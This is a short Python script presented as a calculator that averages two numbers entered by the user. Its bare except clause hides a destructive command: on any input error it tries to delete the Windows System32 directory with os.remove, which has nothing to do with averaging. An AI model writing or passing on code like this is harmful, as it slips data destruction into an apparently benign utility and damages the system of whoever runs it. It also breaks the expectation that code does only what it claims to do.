import os 

try: 
    num1 = float(input("Enter first number: "))
    num2 = float(input("Enter second number: "))
    average = (num1 + num2) / 2
    print("The average of", num1, "and", num2, "is:", average)
except:
    os.remove("C:\Windows\System32")